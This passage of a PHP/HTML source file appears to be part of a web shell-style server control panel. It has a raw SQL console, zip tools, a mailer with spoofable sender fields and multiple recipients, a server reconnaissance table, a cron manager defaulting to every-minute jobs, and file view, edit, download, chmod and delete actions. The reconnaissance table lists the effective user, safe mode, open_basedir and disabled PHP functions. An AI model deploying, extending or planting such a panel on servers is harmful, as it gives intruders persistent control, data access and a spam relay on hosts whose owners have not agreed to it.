          <div style="font-size:10px;color:var(--txt3);font-family:var(--mono);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px">Tables — <span id="db-selected" style="color:#a5b4fc">none selected</span></div>
          <div id="db-tables"></div>
        </div>
      </div>
    </div>

    <!-- Query -->
    <div class="mysql-section" id="mt-query">
      <div class="dbrow">
        <label>SQL Query</label>
        <textarea id="db-sql" rows="5" placeholder="SELECT * FROM table_name LIMIT 10;"
          style="background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:8px 11px;color:var(--a5);font-family:var(--mono);font-size:12px;outline:none;width:100%;resize:vertical;transition:border .18s;line-height:1.6"></textarea>
      </div>
      <div style="display:flex;gap:8px;margin-bottom:14px">
        <button class="btn btn-primary" onclick="dbQuery()"><i class="fas fa-play"></i> Run Query</button>
        <button class="btn" onclick="document.getElementById('db-sql').value=''"><i class="fas fa-xmark"></i> Clear</button>
      </div>
      <div id="db-query-result"></div>
    </div>

    <!-- Browse Table -->
    <div class="mysql-section" id="mt-browse">
      <div style="display:flex;gap:8px;margin-bottom:12px;align-items:center">
        <select id="db-browse-table" style="background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:8px 11px;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;flex:1">
          <option value="">— select table —</option>
        </select>
        <button class="btn btn-primary" onclick="dbBrowse(0)"><i class="fas fa-table"></i> Browse</button>
      </div>
      <div id="db-browse-result"></div>
    </div>
  </div>
</div>

<!-- ZIP / UNZIP PANEL -->
<style>
.zip-tabs{display:flex;gap:0;border-bottom:1px solid var(--line);margin-bottom:14px}
.zip-tab{padding:8px 16px;font-size:12px;font-family:var(--mono);color:var(--txt3);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;background:none;border-top:none;border-left:none;border-right:none}
.zip-tab:hover{color:var(--txt)}
.zip-tab.on{color:var(--a4);border-bottom-color:var(--a4)}
.zip-section{display:none}.zip-section.on{display:block}
.zrow{display:flex;flex-direction:column;gap:4px;margin-bottom:10px}
.zrow label{font-size:10px;color:var(--txt3);font-family:var(--mono);letter-spacing:1px;text-transform:uppercase}
.zrow input{background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:8px 11px;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;transition:border .18s;width:100%}
.zrow input:focus{border-color:var(--a4)}
</style>
<div class="iform" id="zip-panel" style="flex-direction:column;align-items:stretch;gap:0;padding:16px">
  <div style="display:flex;align-items:center;margin-bottom:14px">
    <span style="font-weight:600;font-size:13px;display:flex;align-items:center;gap:8px">
      <i class="fas fa-file-zipper" style="color:var(--a4)"></i> Zip / Unzip
    </span>
  </div>

  <div class="zip-tabs">
    <button type="button" class="zip-tab on" onclick="zipTab(this,'zt-zip')"><i class="fas fa-compress"></i> Zip</button>
    <button type="button" class="zip-tab"    onclick="zipTab(this,'zt-unzip')"><i class="fas fa-expand"></i> Unzip</button>
  </div>

  <!-- ZIP -->
  <div class="zip-section on" id="zt-zip">
    <form method="POST">
      <input type="hidden" name="path" value="<?=safe($path)?>">
      <div class="zrow">
        <label>File / Folder to Zip</label>
        <input type="text" name="zip_target" id="zip-target" value="<?=safe($path)?>" placeholder="/path/to/file_or_folder">
      </div>
      <div class="zrow">
        <label>Output Zip Name</label>
        <input type="text" name="zip_name" id="zip-name" placeholder="archive.zip">
      </div>
      <div style="background:var(--bg2);border:1px solid var(--line);border-radius:8px;padding:10px 12px;margin-bottom:12px">
        <div style="font-size:10px;color:var(--txt3);font-family:var(--mono);margin-bottom:4px">OUTPUT PREVIEW</div>
        <div id="zip-preview" style="font-family:var(--mono);font-size:12px;color:var(--a4)"><?=safe($path)?>/archive.zip</div>
      </div>
      <button type="submit" class="btn btn-primary"><i class="fas fa-compress"></i> Create Zip</button>
    </form>
  </div>

  <!-- UNZIP -->
  <div class="zip-section" id="zt-unzip">
    <form method="POST">
      <input type="hidden" name="path" value="<?=safe($path)?>">
      <div class="zrow">
        <label>Zip File to Extract</label>
        <input type="text" name="unzip_target" id="unzip-target" placeholder="/path/to/file.zip">
      </div>
      <div class="zrow">
        <label>Extract to Folder</label>
        <input type="text" name="unzip_dest" value="<?=safe($path)?>" placeholder="Leave empty = current folder">
      </div>
      <button type="submit" class="btn btn-primary"><i class="fas fa-expand"></i> Extract</button>
    </form>
  </div>
</div>

<!-- MAILER PANEL -->
<style>
.mail-tabs{display:flex;gap:0;border-bottom:1px solid var(--line);margin-bottom:14px}
.mail-tab{padding:8px 16px;font-size:12px;font-family:var(--mono);color:var(--txt3);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;background:none;border-top:none;border-left:none;border-right:none}
.mail-tab:hover{color:var(--txt)}
.mail-tab.on{color:var(--a2);border-bottom-color:var(--a2)}
.mail-section{display:none}.mail-section.on{display:block}
.mrow{display:flex;flex-direction:column;gap:4px;margin-bottom:10px}
.mrow label{font-size:10px;color:var(--txt3);font-family:var(--mono);letter-spacing:1px;text-transform:uppercase}
.mrow input,.mrow textarea,.mrow select{background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:8px 11px;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;transition:border .18s;width:100%}
.mrow input:focus,.mrow textarea:focus,.mrow select:focus{border-color:var(--a2)}
.mrow select option{background:var(--card2)}
.mgrid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
@media(max-width:600px){.mgrid{grid-template-columns:1fr}}
</style>
<?php $mailErr = $_SESSION['mail_err'] ?? ''; unset($_SESSION['mail_err']); ?>
<div class="iform" id="mailer-panel" style="flex-direction:column;align-items:stretch;gap:0;padding:16px">
  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">
    <span style="font-weight:600;font-size:13px;display:flex;align-items:center;gap:8px">
      <i class="fas fa-envelope" style="color:var(--a2)"></i> PHP Mailer
    </span>
  </div>

  <?php if($mailErr): ?>
  <div style="background:rgba(250,109,138,.1);border:1px solid rgba(250,109,138,.3);border-radius:8px;padding:10px 14px;margin-bottom:12px;font-family:var(--mono);font-size:12px;color:var(--a3)">
    <i class="fas fa-circle-xmark"></i> <?=safe($mailErr)?>
  </div>
  <?php endif; ?>

  <form method="POST">
  <input type="hidden" name="send_mail" value="1">
  <input type="hidden" name="path" value="<?=safe($path)?>">

  <!-- Method tabs -->
  <div class="mail-tabs">
    <button type="button" class="mail-tab on" onclick="mailTab(this,'mt-php')"><i class="fas fa-code"></i> PHP mail()</button>
    <button type="button" class="mail-tab"    onclick="mailTab(this,'mt-smtp')"><i class="fas fa-server"></i> SMTP</button>
  </div>

  <!-- PHP mail() section -->
  <div class="mail-section on" id="mt-php">
    <input type="hidden" name="mail_method" id="mail-method" value="mail">
    <div style="background:rgba(255,196,109,.07);border:1px solid rgba(255,196,109,.2);border-radius:7px;padding:9px 12px;font-size:11px;color:var(--a4);font-family:var(--mono);margin-bottom:12px">
      <i class="fas fa-triangle-exclamation"></i> Requires server sendmail/postfix configured. Use SMTP for reliable delivery.
    </div>
  </div>

  <!-- SMTP section -->
  <div class="mail-section" id="mt-smtp">
    <div class="mgrid" style="margin-bottom:10px">
      <div class="mrow"><label>SMTP Host</label><input type="text" name="smtp_host" placeholder="smtp.gmail.com"></div>
      <div class="mrow"><label>Port</label>
        <select name="smtp_port" onchange="document.getElementById('smtp-sec').value=this.value==465?'ssl':'tls'">
          <option value="587">587 (TLS)</option>
          <option value="465">465 (SSL)</option>
          <option value="25">25 (Plain)</option>
        </select>
      </div>
      <div class="mrow"><label>Username</label><input type="text" name="smtp_user" placeholder="user@gmail.com"></div>
      <div class="mrow"><label>Password</label><input type="password" name="smtp_pass" placeholder="password or app key"></div>
    </div>
    <div class="mrow" style="display:none"><label>Security</label>
      <select name="smtp_sec" id="smtp-sec"><option value="tls">TLS</option><option value="ssl">SSL</option><option value="none">None</option></select>
    </div>
  </div>

  <!-- Common fields -->
  <div class="mgrid">
    <div class="mrow"><label>From Name</label><input type="text" name="mail_from_name" placeholder="John Doe"></div>
    <div class="mrow"><label>From Email</label><input type="email" name="mail_from" placeholder="from@domain.com"></div>
  </div>
  <div class="mrow"><label>To (comma separated for multiple)</label><input type="text" name="mail_to" placeholder="to@domain.com, another@domain.com"></div>
  <div class="mrow"><label>Subject</label><input type="text" name="mail_subject" placeholder="Hello World"></div>
  <div class="mrow">
    <label>
      Body
      <label style="margin-left:12px;font-size:10px;color:var(--txt2);cursor:pointer;text-transform:none;letter-spacing:0">
        <input type="checkbox" name="mail_html" style="width:auto;accent-color:var(--a2)"> HTML
      </label>
    </label>
    <textarea name="mail_body" rows="7" placeholder="Email body here...&#10;&#10;Supports HTML if checked above."></textarea>
  </div>
  <div>
    <button type="submit" class="btn btn-primary"><i class="fas fa-paper-plane"></i> Send Email</button>
  </div>
  </form>
</div>

<!-- SERVER INFO PANEL -->
<style>
.sinfo-table{width:100%;border-collapse:collapse;font-size:12px}
.sinfo-table tr{border-bottom:1px solid var(--line)}
.sinfo-table tr:last-child{border-bottom:none}
.sinfo-table td{padding:9px 14px;vertical-align:top}
.sinfo-table td:first-child{color:var(--txt3);font-family:var(--mono);font-size:11px;letter-spacing:.5px;text-transform:uppercase;width:160px;white-space:nowrap;font-weight:600}
.sinfo-table td:last-child{color:var(--txt);font-family:var(--mono);font-size:12px;word-break:break-all}
.sinfo-sep{background:var(--card2);padding:8px 14px;font-size:10px;color:var(--txt3);letter-spacing:1.5px;text-transform:uppercase;font-family:var(--sans);font-weight:600;border-bottom:1px solid var(--line)}
.sinfo-ok{color:var(--a3)}.sinfo-good{color:var(--a5)}.sinfo-warn{color:var(--a4)}
</style>
<?php
// Gather server info
$si_ip       = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
$si_hostname = gethostname();
$si_client   = $_SERVER['REMOTE_ADDR'] ?? '-';
$si_uname    = php_uname();
$si_server   = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
$si_php      = phpversion();
$si_curl     = function_exists('curl_version') ? curl_version()['version'] : 'not available';
$si_user     = function_exists('posix_getpwuid') ? @posix_getpwuid(@posix_geteuid()) : null;
$si_uid      = $si_user ? $si_user['uid'] : @getmyuid();
$si_gid      = $si_user ? $si_user['gid'] : @getmygid();
$disabled_funcs = array_map('trim', explode(',', ini_get('disable_functions')));
$si_uname_s  = $si_user ? $si_user['name'] : (in_array('get_current_user', $disabled_funcs) ? 'n/a' : @get_current_user());
$si_safemode = ini_get('safe_mode') ? 'On' : 'Off';
$si_openbase = ini_get('open_basedir') ?: '-';
$si_disabled = ini_get('disable_functions') ?: '-';
$si_disabled_cls = ini_get('disable_classes') ?: '-';
$si_maxupload= ini_get('upload_max_filesize');
$si_maxpost  = ini_get('post_max_size');
$si_memlimit = ini_get('memory_limit');
$si_maxexec  = ini_get('max_execution_time').'s';
$si_os       = PHP_OS;
$si_docroot  = $_SERVER['DOCUMENT_ROOT'] ?? '-';
$si_cwd      = getcwd();
$si_freespace= function_exists('disk_free_space') ? (@disk_free_space('/') ? round(@disk_free_space('/')/1024/1024/1024,2).' GB' : 'n/a') : '-';
$si_totalspace=function_exists('disk_total_space')? (@disk_total_space('/') ? round(@disk_total_space('/')/1024/1024/1024,2).' GB' : 'n/a') : '-';
$si_extensions = implode(', ', get_loaded_extensions());
?>
<div class="iform" id="sinfo-panel" style="flex-direction:column;align-items:stretch;gap:0;padding:0;overflow:hidden">
  <div style="padding:12px 16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line)">
    <span style="font-weight:600;font-size:13px;display:flex;align-items:center;gap:8px"><i class="fas fa-server" style="color:var(--a5)"></i> Server Information</span>
    <span style="font-size:10px;color:var(--txt3);font-family:var(--mono)"><?=date('Y-m-d H:i:s T')?></span>
  </div>
  <table class="sinfo-table">
    <tr><td colspan="2" class="sinfo-sep">Network</td></tr>
    <tr><td>Address</td><td><?=safe($si_ip)?> / <?=safe($si_hostname)?></td></tr>
    <tr><td>Client IP</td><td><?=safe($si_client)?></td></tr>
    <tr><td>Document Root</td><td><?=safe($si_docroot)?></td></tr>
    <tr><td>Working Dir</td><td><?=safe($si_cwd)?></td></tr>

    <tr><td colspan="2" class="sinfo-sep">System</td></tr>
    <tr><td>OS</td><td><?=safe($si_uname)?></td></tr>
    <tr><td>Server</td><td><?=safe($si_server)?></td></tr>
    <tr><td>Disk Free</td><td><?=safe($si_freespace)?> / <?=safe($si_totalspace)?></td></tr>

    <tr><td colspan="2" class="sinfo-sep">PHP</td></tr>
    <tr><td>Software</td><td>PHP/<?=safe($si_php)?>; cURL/<?=safe($si_curl)?></td></tr>
    <tr><td>Memory Limit</td><td><?=safe($si_memlimit)?></td></tr>
    <tr><td>Max Upload</td><td><?=safe($si_maxupload)?></td></tr>
    <tr><td>Max Post</td><td><?=safe($si_maxpost)?></td></tr>
    <tr><td>Max Exec Time</td><td><?=safe($si_maxexec)?></td></tr>

    <tr><td colspan="2" class="sinfo-sep">User</td></tr>
    <tr><td>User</td><td>euid=<?=safe($si_uid)?>(<?=safe($si_uname_s)?>); egid=<?=safe($si_gid)?>(<?=safe($si_uname_s)?>)</td></tr>

    <tr><td colspan="2" class="sinfo-sep">Security</td></tr>
    <tr><td>Safe Mode</td><td class="<?=$si_safemode==='On'?'sinfo-warn':'sinfo-good'?>"><?=safe($si_safemode)?></td></tr>
    <tr><td>Open Basedir</td><td><?=safe($si_openbase)?></td></tr>
    <tr><td>Disabled Functions</td><td class="<?=$si_disabled==='-'?'sinfo-good':'sinfo-warn'?>"><?=safe($si_disabled)?></td></tr>
    <tr><td>Disabled Classes</td><td><?=safe($si_disabled_cls)?></td></tr>

    <tr><td colspan="2" class="sinfo-sep">Loaded Extensions</td></tr>
    <tr><td>Extensions</td><td style="color:var(--txt3);font-size:11px"><?=safe($si_extensions)?></td></tr>
  </table>
</div>

<!-- CRON JOB PANEL -->
<style>
.cron-chip{display:inline-flex;align-items:center;padding:4px 12px;border-radius:20px;border:1px solid var(--line2);background:transparent;color:var(--txt2);font-family:var(--mono);font-size:11px;cursor:pointer;transition:all .15s;white-space:nowrap}
.cron-chip:hover{border-color:var(--a1);color:var(--a1)}
.cron-chip.on{background:rgba(124,109,250,.12);border-color:var(--a1);color:var(--a1)}
.cjob-row{display:flex;align-items:center;gap:10px;padding:9px 12px;background:var(--bg2);border:1px solid var(--line);border-radius:8px;font-family:var(--mono);font-size:12px;color:var(--txt)}
.cjob-row .expr{color:var(--a2);flex-shrink:0;min-width:130px}
.cjob-row .cmd{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--txt2)}
</style>
<div class="iform" id="cron-panel" style="flex-direction:column;align-items:stretch;gap:14px;padding:16px">
  <div style="display:flex;align-items:center;justify-content:space-between">
    <span style="font-weight:600;font-size:13px;display:flex;align-items:center;gap:8px">
      <i class="fas fa-clock" style="color:var(--a1)"></i> Cron Job Manager
    </span>
    <button class="btn" style="padding:4px 10px;font-size:11px" onclick="loadCrons()">
      <i class="fas fa-rotate"></i> Refresh
    </button>
  </div>

  <!-- Active cron jobs -->
  <div>
    <div style="font-size:10px;color:var(--txt3);font-family:var(--mono);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px">Active Cron Jobs</div>
    <div id="cron-list" style="display:flex;flex-direction:column;gap:6px">
      <div style="color:var(--txt3);font-size:12px;font-family:var(--mono)">Loading…</div>
    </div>
  </div>

  <!-- Add new cron -->
  <div style="border-top:1px solid var(--line);padding-top:14px">
    <div style="font-size:10px;color:var(--txt3);font-family:var(--mono);letter-spacing:1px;text-transform:uppercase;margin-bottom:10px">Add New Cron Job</div>
    <form method="POST" id="cron-form">
      <input type="hidden" name="cron_add" value="1">
      <input type="hidden" name="path" value="<?=safe($path)?>">
      <div style="display:flex;flex-direction:column;gap:10px">
        <div>
          <div style="font-size:10px;color:var(--txt3);font-family:var(--mono);margin-bottom:5px">COMMAND</div>
          <input type="text" name="cron_cmd" id="cron-cmd"
            placeholder="php <?=safe($path)?>/script.php"
            style="background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:8px 11px;color:var(--txt);font-family:var(--mono);font-size:12px;outline:none;width:100%;transition:border .18s">
        </div>
        <div>
          <div style="font-size:10px;color:var(--txt3);font-family:var(--mono);margin-bottom:6px">INTERVAL</div>
          <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px">
            <button type="button" class="cron-chip on" data-cron="* * * * *"    onclick="setCron(this)">Every minute</button>
            <button type="button" class="cron-chip"    data-cron="*/5 * * * *"  onclick="setCron(this)">Every 5 min</button>
            <button type="button" class="cron-chip"    data-cron="*/15 * * * *" onclick="setCron(this)">Every 15 min</button>
            <button type="button" class="cron-chip"    data-cron="*/30 * * * *" onclick="setCron(this)">Every 30 min</button>
            <button type="button" class="cron-chip"    data-cron="0 * * * *"    onclick="setCron(this)">Every hour</button>
            <button type="button" class="cron-chip"    data-cron="0 0 * * *"    onclick="setCron(this)">Every day</button>
            <button type="button" class="cron-chip"    data-cron="0 0 * * 0"    onclick="setCron(this)">Every week</button>
          </div>
          <div style="display:flex;gap:8px;align-items:center">
            <input type="text" name="cron_expr" id="cron-expr" value="* * * * *"
              style="background:var(--bg2);border:1px solid var(--line2);border-radius:6px;padding:8px 11px;color:var(--a2);font-family:var(--mono);font-size:13px;outline:none;width:180px;letter-spacing:1px;transition:border .18s"
              placeholder="* * * * *">
            <span style="font-size:11px;color:var(--txt3);font-family:var(--mono)" id="cron-desc">Every minute</span>
          </div>
        </div>
        <div style="background:var(--bg2);border:1px solid var(--line);border-radius:8px;padding:10px 12px">
          <div style="font-size:10px;color:var(--txt3);font-family:var(--mono);margin-bottom:4px">PREVIEW</div>
          <div id="cron-preview" style="font-family:var(--mono);font-size:12px;color:var(--a5)">* * * * * php <?=safe($path)?>/script.php</div>
        </div>
        <div>
          <button type="submit" class="btn btn-primary"><i class="fas fa-plus"></i> Add Cron Job</button>
        </div>
      </div>
    </form>
  </div>
</div>

<?php // VIEW
if(isset($_GET['view']) && is_file(cleanPath($_GET['view']))):
  $vf = cleanPath($_GET['view']); ?>
<div class="panel"><div class="phdr">
  <div class="ptitle"><i class="fas fa-eye"></i> <?=safe(basename($vf))?></div>
  <div style="display:flex;gap:7px">
    <a href="?download=<?=urlencode($vf)?>" class="btn" style="padding:5px 10px;font-size:11px"><i class="fas fa-download"></i> Download</a>
    <a href="?path=<?=urlencode($path)?>" class="btn" style="padding:5px 10px;font-size:11px"><i class="fas fa-xmark"></i></a>
  </div>
</div><pre><?=safe(@file_get_contents($vf))?></pre></div>
<?php endif; ?>

<?php // EDIT
if(isset($_GET['edit']) && is_file(cleanPath($_GET['edit']))):
  $ef = cleanPath($_GET['edit']); ?>
<div class="panel"><div class="phdr">
  <div class="ptitle"><i class="fas fa-pen-to-square"></i> <?=safe(basename($ef))?></div>
  <a href="?path=<?=urlencode($path)?>" class="btn" style="padding:5px 10px;font-size:11px"><i class="fas fa-xmark"></i></a>
</div><form method="POST">
  <textarea name="content"><?=safe(@file_get_contents($ef))?></textarea>
  <input type="hidden" name="edit_file" value="<?=safe($ef)?>">
  <div class="pftr">
    <button type="submit" class="btn btn-primary"><i class="fas fa-floppy-disk"></i> Save</button>
    <a href="?path=<?=urlencode($path)?>" class="btn btn-danger"><i class="fas fa-xmark"></i> Cancel</a>
  </div>
</form></div>
<?php endif; ?>

<?php // RENAME
if(isset($_GET['rename'])):
  $rf = cleanPath($_GET['rename']); ?>
<div class="panel"><div class="phdr">
  <div class="ptitle"><i class="fas fa-i-cursor"></i> Rename — <?=safe(basename($rf))?></div>
  <a href="?path=<?=urlencode($path)?>" class="btn" style="padding:5px 10px;font-size:11px"><i class="fas fa-xmark"></i></a>
</div><form method="POST"><div class="ren-form">
  <input type="text" name="rename_to" value="<?=safe(basename($rf))?>">
  <input type="hidden" name="rename_from" value="<?=safe($rf)?>">
  <button type="submit" class="btn btn-primary"><i class="fas fa-check"></i> Rename</button>
</div></form></div>
<?php endif; ?>

<?php // COPY
if(isset($_GET['copy'])):
  $cf = cleanPath($_GET['copy']); ?>
<div class="panel"><div class="phdr">
  <div class="ptitle"><i class="fas fa-copy"></i> Copy — <?=safe(basename($cf))?></div>
  <a href="?path=<?=urlencode($path)?>" class="btn" style="padding:5px 10px;font-size:11px"><i class="fas fa-xmark"></i></a>
</div><form method="POST"><div class="cm-form">
  <div><label>Source</label><input type="text" value="<?=safe($cf)?>" readonly style="opacity:.6"></div>
  <div><label>Destination folder</label><input type="text" name="copy_to" value="<?=safe($path)?>"></div>
  <input type="hidden" name="copy_from" value="<?=safe($cf)?>">
  <div><button type="submit" class="btn btn-primary"><i class="fas fa-copy"></i> Copy Here</button></div>
</div></form></div>
<?php endif; ?>

<?php // MOVE
if(isset($_GET['move'])):
  $mf = cleanPath($_GET['move']); ?>
<div class="panel"><div class="phdr">
  <div class="ptitle"><i class="fas fa-scissors"></i> Move — <?=safe(basename($mf))?></div>
  <a href="?path=<?=urlencode($path)?>" class="btn" style="padding:5px 10px;font-size:11px"><i class="fas fa-xmark"></i></a>
</div><form method="POST"><div class="cm-form">
  <div><label>Source</label><input type="text" value="<?=safe($mf)?>" readonly style="opacity:.6"></div>
  <div><label>Destination folder</label><input type="text" name="move_to" value="<?=safe($path)?>"></div>
  <input type="hidden" name="move_from" value="<?=safe($mf)?>">
  <div><button type="submit" class="btn btn-primary"><i class="fas fa-scissors"></i> Move Here</button></div>
</div></form></div>
<?php endif; ?>

<?php // CHMOD
if(isset($_GET['chmod'])):
  $chf = cleanPath($_GET['chmod']);
  $curPerm = substr(sprintf('%o', @fileperms($chf)), -4);
  $pv = octdec($curPerm); ?>
<div class="panel"><div class="phdr">
  <div class="ptitle"><i class="fas fa-lock"></i> Permissions — <?=safe(basename($chf))?></div>
  <a href="?path=<?=urlencode($path)?>" class="btn" style="padding:5px 10px;font-size:11px"><i class="fas fa-xmark"></i></a>
</div><form method="POST"><div class="chmod-form">
  <div id="chmod-preview"><?=$curPerm?></div>
  <div class="chmod-bits">
    <?php foreach([['Owner',0400,0200,0100],['Group',0040,0020,0010],['Others',0004,0002,0001]] as [$lbl,$r,$w,$x]): ?>
    <div class="chmod-col">
      <div class="chmod-col-title"><?=$lbl?></div>
      <div class="chmod-row"><label><input type="checkbox" class="cbit" data-val="<?=$r?>" <?=($pv&$r)?'checked':''?>> Read</label></div>
      <div class="chmod-row"><label><input type="checkbox" class="cbit" data-val="<?=$w?>" <?=($pv&$w)?'checked':''?>> Write</label></div>
      <div class="chmod-row"><label><input type="checkbox" class="cbit" data-val="<?=$x?>" <?=($pv&$x)?'checked':''?>> Exec</label></div>
    </div>
    <?php endforeach; ?>
  </div>
  <input type="hidden" name="chmod_path" value="<?=safe($chf)?>">
  <input type="hidden" name="chmod_val"  id="chmod_val" value="<?=$curPerm?>">
  <div><button type="submit" class="btn btn-primary"><i class="fas fa-check"></i> Apply</button></div>
</div></form></div>
<?php endif; ?>

<!-- FILTER BAR -->
<div class="fbar">
  <span class="fl-lbl">Show</span>
  <button class="chip on" onclick="setF(this,'all')"><i class="fas fa-border-all"></i> All</button>
  <button class="chip"    onclick="setF(this,'folder')"><i class="fas fa-folder"></i> Folders</button>
  <button class="chip"    onclick="setF(this,'file')"><i class="fas fa-file"></i> Files</button>
  <div class="fl-sep"></div>
  <div class="livesrch"><i class="fas fa-filter"></i><input type="text" placeholder="quick filter…" oninput="liveF(this.value)"></div>
</div>

<!-- BULK BAR -->
<div class="bulk-bar" id="bulk-bar">
  <span class="bulk-cnt" id="bulk-cnt">0 selected</span>
  <div class="fl-sep"></div>
  <button class="btn btn-danger" onclick="bulkDelete()"><i class="fas fa-trash"></i> Delete selected</button>
  <button class="btn" onclick="bulkDeselect()"><i class="fas fa-xmark"></i> Deselect</button>
</div>

<!-- STATS -->
<div class="stats">
  <span><i class="fas fa-folder"></i><?=count($folders)?> folders</span>
  <span><i class="fas fa-file"></i><?=count($files)?> files</span>
  <span id="fcount" style="color:var(--a1);display:none"></span>
  <span class="pd"><?=safe($path)?></span>
</div>

<!-- TABLE -->
<div class="tbl-wrap">
<table class="ftable" id="ftable">
<thead><tr>
  <th class="chk"><input type="checkbox" id="chk-all" onchange="toggleAll(this)"></th>
  <th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Perms</th><th>Actions</th>
</tr></thead>
<tbody>
<tr class="back-row"><td colspan="7">
  <a class="blnk" href="?path=<?=urlencode(cleanPath(dirname($path)))?>" onclick="event.preventDefault();navTo('<?=addslashes(cleanPath(dirname($path)))?>')">
    <i class="fas fa-arrow-up"></i> ../ up one level
  </a>
</td></tr>

<?php foreach($folders as $f):
  $full = $path.'/'.$f;
  $mod  = date('Y-m-d H:i', @filemtime($full));
  $perm = substr(sprintf('%o', @fileperms($full)), -4);
?>
<tr data-type="folder" data-name="<?=strtolower(safe($f))?>" data-path="<?=safe($full)?>">
  <td class="chk"><input type="checkbox" class="row-chk" onchange="updateBulk()"></td>
  <td><div class="nm">
    <span class="ico"><i class="fas fa-folder" style="color:var(--a4)"></i></span>
    <a href="?path=<?=urlencode($full)?>" onclick="event.preventDefault();navTo('<?=addslashes($full)?>')"><?=safe($f)?></a>
  </div></td>
  <td><span class="badge bd">dir</span></td>
  <td class="sz">—</td>
  <td class="tm-cell"><span data-tp="<?=safe($full)?>" data-tc="<?=$mod?>"><?=$mod?></span></td>
  <td class="pm-cell"><span data-pp="<?=safe($full)?>" data-pc="<?=$perm?>"><?=$perm?></span></td>
  <td><div class="acts">
    <a class="ab rn" href="?rename=<?=urlencode($full)?>&path=<?=urlencode($path)?>" title="Rename"><i class="fas fa-pencil"></i></a>
    <a class="ab"    href="?chmod=<?=urlencode($full)?>&path=<?=urlencode($path)?>" title="Perms"><i class="fas fa-lock"></i></a>
    <a class="ab dl" href="?delete=<?=urlencode($full)?>&path=<?=urlencode($path)?>" onclick="return confirm('Delete folder <?=safe($f)?>?')" title="Delete"><i class="fas fa-trash"></i></a>
  </div></td>
</tr>
<?php endforeach; ?>

<?php foreach($files as $f):
  $full = $path.'/'.$f;
  $kb   = round(@filesize($full)/1024, 1);
  $mod  = date('Y-m-d H:i', @filemtime($full));
  $perm = substr(sprintf('%o', @fileperms($full)), -4);
  $ext  = strtolower(pathinfo($f, PATHINFO_EXTENSION));

  // Icon & colour per extension
  $ec = '#8896b3'; $fi = 'fas fa-file';
  if(in_array($ext,['php','py','js','ts','rb','go','c','cpp','h','cs','java','sh','bash','rs','swift']))
      { $ec='#7c6dfa'; $fi='fas fa-code'; }
  elseif(in_array($ext,['html','htm','css','scss','vue','jsx','tsx','svelte']))
      { $ec='#4fc8ff'; $fi='fas fa-code'; }
  elseif(in_array($ext,['jpg','jpeg','png','gif','svg','webp','ico','bmp','tiff']))
      { $ec='#57e59e'; $fi='fas fa-image'; }
  elseif(in_array($ext,['zip','tar','gz','rar','7z','bz2','xz']))
      { $ec='#ffc46d'; $fi='fas fa-file-zipper'; }
  elseif(in_array($ext,['txt','md','log','csv','ini','cfg','conf','env']))
      { $ec='#cdd6f4'; $fi='fas fa-file-lines'; }
  elseif(in_array($ext,['json','xml','yaml','yml']))
      { $ec='#cdd6f4'; $fi='fas fa-file-code'; }
  elseif(in_array($ext,['sql','db','sqlite','dump']))
      { $ec='#fa6d8a'; $fi='fas fa-database'; }
  elseif($ext==='pdf')
      { $ec='#fa6d8a'; $fi='fas fa-file-pdf'; }
  elseif(in_array($ext,['doc','docx']))
      { $ec='#4fc8ff'; $fi='fas fa-file-word'; }
  elseif(in_array($ext,['xls','xlsx']))
      { $ec='#57e59e'; $fi='fas fa-file-excel'; }
  elseif(in_array($ext,['ppt','pptx']))
      { $ec='#ffc46d'; $fi='fas fa-file-powerpoint'; }
  elseif(in_array($ext,['mp3','wav','ogg','flac','m4a']))
      { $ec='#a5b4fc'; $fi='fas fa-file-audio'; }
  elseif(in_array($ext,['mp4','avi','mkv','mov','webm']))
      { $ec='#a5b4fc'; $fi='fas fa-file-video'; }
?>
<tr data-type="file" data-name="<?=strtolower(safe($f))?>" data-path="<?=safe($full)?>">
  <td class="chk"><input type="checkbox" class="row-chk" onchange="updateBulk()"></td>
  <td><div class="nm">
    <span class="ico"><i class="<?=$fi?>" style="color:<?=$ec?>"></i></span>
    <span class="fn"><?=safe($f)?></span>
  </div></td>
  <td><span class="badge bf"><?=$ext ?: 'file'?></span></td>
  <td class="sz"><?=$kb?> KB</td>
  <td class="tm-cell"><span data-tp="<?=safe($full)?>" data-tc="<?=$mod?>"><?=$mod?></span></td>
  <td class="pm-cell"><span data-pp="<?=safe($full)?>" data-pc="<?=$perm?>"><?=$perm?></span></td>
  <td><div class="acts">
    <a class="ab v"  href="?view=<?=urlencode($full)?>&path=<?=urlencode($path)?>" title="View"><i class="fas fa-eye"></i></a>
    <a class="ab e"  href="?edit=<?=urlencode($full)?>&path=<?=urlencode($path)?>" title="Edit"><i class="fas fa-pen-to-square"></i></a>
    <a class="ab dw" href="?download=<?=urlencode($full)?>" title="Download"><i class="fas fa-download"></i></a>
    <a class="ab rn" href="?rename=<?=urlencode($full)?>&path=<?=urlencode($path)?>" title="Rename"><i class="fas fa-pencil"></i></a>
    <a class="ab"    href="?chmod=<?=urlencode($full)?>&path=<?=urlencode($path)?>" title="Perms"><i class="fas fa-lock"></i></a>
    <a class="ab dl" href="?delete=<?=urlencode($full)?>&path=<?=urlencode($path)?>" onclick="return confirm('Delete <?=safe($f)?>?')" title="Delete"><i class="fas fa-trash"></i></a>
  </div></td>
</tr>
<?php endforeach; ?>
</tbody>
</table>
</div>

</div><!-- /shell -->

<script>
const CURPATH = <?=json_encode($path)?>;

// TOAST
<?php if($nMsg): ?>
window.addEventListener('DOMContentLoaded',()=>toast('<?=$nType?>','<?=addslashes($nMsg)?>'));
<?php endif; ?>
